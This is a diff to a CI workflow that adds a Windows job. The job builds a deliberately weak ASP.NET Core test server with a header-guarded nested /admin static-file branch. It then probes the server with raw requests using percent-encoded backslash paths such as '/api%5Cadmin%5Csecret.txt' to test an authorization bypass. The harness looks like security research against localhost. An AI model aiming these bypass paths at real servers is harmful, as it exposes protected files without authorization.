@@ -1172,3 +1172,190 @@ jobs:
             /tmp/map-lab/results.json
             /tmp/map-lab/probe.out
             /tmp/map-lab/server.log
+
+
+  nested-map-staticfile-windows:
+    runs-on: windows-latest
+    timeout-minutes: 20
+    name: nested-map-staticfile-windows-net11
+    steps:
+      - uses: actions/checkout@v4
+
+      - uses: actions/setup-dotnet@v4
+        with:
+          dotnet-version: 11.0.100-rc.1.26425.128
+
+      - name: Build Windows static-file authorization harness
+        shell: pwsh
+        run: |
+          $ErrorActionPreference = 'Stop'
+          New-Item -ItemType Directory -Force -Path D:\map-static-lab | Out-Null
+
+          @'
+          <Project Sdk="Microsoft.NET.Sdk.Web">
+            <PropertyGroup>
+              <TargetFramework>net11.0</TargetFramework>
+              <ImplicitUsings>enable</ImplicitUsings>
+              <Nullable>enable</Nullable>
+            </PropertyGroup>
+          </Project>
+          '@ | Set-Content D:\map-static-lab\MapStaticLab.csproj
+
+          @'
+          using Microsoft.AspNetCore.Http.Features;
+          using Microsoft.Extensions.FileProviders;
+
+          var builder = WebApplication.CreateBuilder(args);
+          builder.WebHost.ConfigureKestrel(o => o.ListenLocalhost(5035));
+          var app = builder.Build();
+
+          var contentRoot = Path.Combine(AppContext.BaseDirectory, "files");
+          Directory.CreateDirectory(Path.Combine(contentRoot, "admin"));
+          File.WriteAllText(Path.Combine(contentRoot, "admin", "secret.txt"), "TOP_SECRET_7B4F");
+
+          app.Use(async (ctx, next) =>
+          {
+              Console.WriteLine($"TOP raw={ctx.Features.Get<IHttpRequestFeature>()?.RawTarget} pathBaseValue={ctx.Request.PathBase.Value} pathValue={ctx.Request.Path.Value}");
+              await next();
+          });
+
+          app.Map("/api", api =>
+          {
+              api.Use(async (ctx, next) =>
+              {
+                  Console.WriteLine($"API raw={ctx.Features.Get<IHttpRequestFeature>()?.RawTarget} pathBaseValue={ctx.Request.PathBase.Value} pathValue={ctx.Request.Path.Value}");
+                  await next();
+              });
+
+              api.Map("/admin", admin =>
+              {
+                  admin.Use(async (ctx, next) =>
+                  {
+                      Console.WriteLine($"AUTH_GUARD_HIT raw={ctx.Features.Get<IHttpRequestFeature>()?.RawTarget} pathBaseValue={ctx.Request.PathBase.Value} pathValue={ctx.Request.Path.Value}");
+                      if (ctx.Request.Headers["X-Admin-Key"] != "research-only")
+                      {
+                          ctx.Response.StatusCode = StatusCodes.Status401Unauthorized;
+                          await ctx.Response.WriteAsync("AUTH_REQUIRED");
+                          return;
+                      }
+                      await next();
+                  });
+
+                  admin.UseStaticFiles(new StaticFileOptions
+                  {
+                      FileProvider = new PhysicalFileProvider(contentRoot),
+                      ServeUnknownFileTypes = false
+                  });
+
+                  admin.Run(async ctx =>
+                  {
+                      ctx.Response.StatusCode = 404;
+                      await ctx.Response.WriteAsync("ADMIN_NOT_FOUND");
+                  });
+              });
+
+              // General /api static files are intentionally available.
+              // The nested /admin branch is expected to protect admin/secret.txt.
+              api.UseStaticFiles(new StaticFileOptions
+              {
+                  FileProvider = new PhysicalFileProvider(contentRoot),
+                  ServeUnknownFileTypes = false
+              });
+
+              api.Run(async ctx =>
+              {
+                  ctx.Response.StatusCode = 404;
+                  await ctx.Response.WriteAsync("API_NOT_FOUND");
+              });
+          });
+
+          app.Run(async ctx =>
+          {
+              ctx.Response.StatusCode = 404;
+              await ctx.Response.WriteAsync("ROOT_NOT_FOUND");
+          });
+
+          await app.RunAsync();
+          '@ | Set-Content D:\map-static-lab\Program.cs
+
+          dotnet build D:\map-static-lab\MapStaticLab.csproj -c Release
+
+      - name: Run Windows nested-Map static-file exploit controls
+        shell: pwsh
+        run: |
+          $ErrorActionPreference = 'Stop'
+          Set-Location D:\map-static-lab
+
+          $proc = Start-Process dotnet -ArgumentList 'run --no-build -c Release --project MapStaticLab.csproj' -RedirectStandardOutput server.log -RedirectStandardError server.err -PassThru
+
+          try {
+            $ready = $false
+            for ($i=0; $i -lt 60; $i++) {
+              try {
+                Invoke-WebRequest -Uri 'http://127.0.0.1:5035/ready' -SkipHttpErrorCheck -TimeoutSec 1 | Out-Null
+                $ready = $true
+                break
+              } catch {
+                Start-Sleep -Milliseconds 250
+              }
+            }
+            if (-not $ready) { throw 'Server did not become ready' }
+
+            function Invoke-Raw([string]$Target, [bool]$Auth) {
+              $client = [System.Net.Sockets.TcpClient]::new('127.0.0.1',5035)
+              try {
+                $stream = $client.GetStream()
+                $extra = if ($Auth) { "X-Admin-Key: research-only`r`n" } else { "" }
+                $req = "GET $Target HTTP/1.1`r`nHost: localhost:5035`r`n" + $extra + "Connection: close`r`n`r`n"
+                $bytes = [System.Text.Encoding]::ASCII.GetBytes($req)
+                $stream.Write($bytes,0,$bytes.Length)
+                $stream.Flush()
+                $reader = [System.IO.StreamReader]::new($stream,[System.Text.Encoding]::Latin1)
+                return $reader.ReadToEnd()
+              } finally {
+                $client.Dispose()
+              }
+            }
+
+            $targets = [ordered]@{
+              normal_no_auth = '/api/admin/secret.txt'
+              normal_with_auth = '/api/admin/secret.txt'
+              backslash_no_auth = '/api%5Cadmin%5Csecret.txt'
+              backslash_with_tail_no_auth = '/api%5Cadmin/secret.txt'
+              backslash_after_admin_no_auth = '/api/admin%5Csecret.txt'
+            }
+
+            $results = [ordered]@{}
+            foreach ($name in $targets.Keys) {
+              $auth = $name -eq 'normal_with_auth'
+              $raw = Invoke-Raw $targets[$name] $auth
+              $status = ($raw -split "`r`n")[0]
+              $results[$name] = [ordered]@{
+                target = $targets[$name]
+                status = $status
+                contains_secret = $raw.Contains('TOP_SECRET_7B4F')
+                contains_auth_required = $raw.Contains('AUTH_REQUIRED')
+                raw = $raw
+              }
+            }
+
+            $results | ConvertTo-Json -Depth 5 | Set-Content results.json
+            Get-Content results.json
+            Write-Host '=== SERVER LOG ==='
+            Get-Content server.log
+            Write-Host '=== SERVER ERR ==='
+            Get-Content server.err
+          }
+          finally {
+            Stop-Process -Id $proc.Id -Force -ErrorAction SilentlyContinue
+          }
+
+      - name: Upload Windows static-file results
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: nested-map-staticfile-windows-net11
+          path: |
+            D:\map-static-lab\results.json
+            D:\map-static-lab\server.log
+            D:\map-static-lab\server.err
